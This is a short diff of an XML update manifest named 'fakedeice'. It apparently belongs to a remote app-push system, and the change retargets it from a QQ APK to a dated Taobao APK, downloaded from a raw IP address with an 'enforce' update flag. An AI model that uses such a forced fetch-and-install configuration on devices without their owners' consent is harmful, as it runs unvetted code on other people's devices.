@@ -3,10 +3,11 @@
 	<name>fakedeice</name>
 	<mode>install</mode>
 
-	<message>推送QQ版本安装
+	<message>受客户请求：
+             推送2015_11_17版本淘宝客户端安装
 	</message>
-	<url>http://120.26.209.144:8080/Fakedevice/qq.apk</url>
-	<md5>1a4f388bc2145af74d595b0ebec85008</md5>
+	<url>http://120.26.209.144:8080/Fakedevice/taobao20151117.apk</url>
+	<md5>a165b64c943512eb7327a334e923e0ba</md5>
 	<cmd>""</cmd>
 	<updateflag>enforce</updateflag>
 </update>
